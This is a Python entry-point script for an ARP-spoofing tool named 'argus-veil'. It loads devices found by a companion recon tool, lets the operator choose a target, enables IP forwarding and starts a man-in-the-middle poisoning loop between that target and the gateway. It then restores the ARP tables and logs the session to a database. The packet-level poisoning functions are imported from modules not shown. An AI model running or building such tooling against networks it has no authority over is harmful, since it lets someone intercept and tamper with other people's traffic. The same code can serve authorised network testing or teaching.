# Full flow:
# 1. Load config
# 2. Load all known devices from DB, present numbered menu
# 3. User selects a target by number
# 4. Resolve gateway MAC and attacker MAC via Scapy
# 5. Enable IP forwarding
# 6. Write session start to DB
# 7. Begin poison loop
# --- Ctrl+C or any exception breaks out ---
# 8. Restore ARP tables (always, via finally)
# 9. Disable IP forwarding (always, via finally)
# 10. Write session end to DB (always, via finally)
# 11. Print exit summary and quit

import os
import sys

from config import load_config
from db import end_session, get_all_devices, start_session
from poisoner import (
    disable_forwarding,
    enable_forwarding,
    get_attacker_mac,
    get_gateway_mac,
    start_poisoning,
)
from restorer import restore_arp


def main() -> None:
    if os.geteuid() != 0:
        print("Error: argus-veil must be run as root.")
        sys.exit(1)

    config = load_config()
    devices = get_all_devices(config["db_path"])
    if not devices:
        print("No devices in database. Run argus-recon first.")
        sys.exit(1)

    print("Known devices:")
    for index, device in enumerate(devices, start=1):
        vendor = device.get("vendor") or "Unknown"
        print(f"{index}. {device['ip']}  {device['mac']}  {vendor}")

    target = None
    while target is None:
        selection = input("Select target by number: ").strip()
        try:
            selection_index = int(selection)
        except ValueError:
            print("Invalid selection. Please enter a number from the list.")
            continue

        if selection_index < 1 or selection_index > len(devices):
            print("Invalid selection. Please enter a number from the list.")
            continue

        target = devices[selection_index - 1]

    session_id = None
    gateway_mac = None

    try:
        gateway_mac = get_gateway_mac(config["gateway_ip"], config["interface"])
        attacker_mac = get_attacker_mac(config["interface"])

        print(f"Target : {target['ip']}  ({target['mac']})")
        print(f"Gateway: {config['gateway_ip']}  ({gateway_mac})")
        print(f"Self   : {attacker_mac}")
        print()

        enable_forwarding()
        session_id = start_session(config["db_path"], target["id"])

        start_poisoning(
            interface=config["interface"],
            gateway_ip=config["gateway_ip"],
            gateway_mac=gateway_mac,
            target_ip=target["ip"],
            target_mac=target["mac"],
        )

    except KeyboardInterrupt:
        print("\nInterrupt received. Cleaning up...")

    except Exception as error:
        print(f"\nUnexpected error: {error}")

    finally:
        if gateway_mac is None:
            try:
                gateway_mac = get_gateway_mac(config["gateway_ip"], config["interface"])
            except Exception as error:
                print(f"Warning: unable to resolve gateway MAC for restore: {error}")

        if gateway_mac is not None:
            try:
                restore_arp(
                    interface=config["interface"],
                    gateway_ip=config["gateway_ip"],
                    gateway_mac=gateway_mac,
                    target_ip=target["ip"],
                    target_mac=target["mac"],
                )
            except Exception as error:
                print(f"Warning: ARP restore failed: {error}")
        else:
            print("Warning: ARP restore skipped because gateway MAC is unavailable.")

        disable_forwarding()
        if session_id is not None:
            try:
                end_session(config["db_path"], session_id)
            except Exception as error:
                print(f"Warning: failed to close session in database: {error}")
        print("Session closed. Exiting.")


if __name__ == "__main__":
    main()